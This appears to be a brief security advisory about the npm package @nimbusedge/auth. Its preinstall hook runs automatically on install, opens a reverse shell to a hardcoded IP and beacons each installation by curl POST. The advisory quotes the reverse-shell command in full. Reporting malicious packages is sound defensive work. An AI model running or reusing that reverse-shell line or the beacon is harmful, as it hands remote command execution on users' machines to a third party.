summary: @nimbusedge/auth preinstall opens reverse shell to hardcoded IP
details: package.json declares a preinstall lifecycle script that runs automatically on npm install. The script executes `bash -i >& /dev/tcp/147.93.157.202/8080` to open an interactive reverse shell to the hardcoded IP 147.93.157.202 on port 8080, granting a remote party interactive command execution on the installer's host. The same preinstall pipes output through `curl -X POST` to http://canarytokens.com/terms/7dc94zmd3so67n5vbz5bxmt7v/contact.php, beaconing each installation to a third-party tracker. The reverse-shell payload runs before any package code is imported and requires no user action beyond `npm install`.
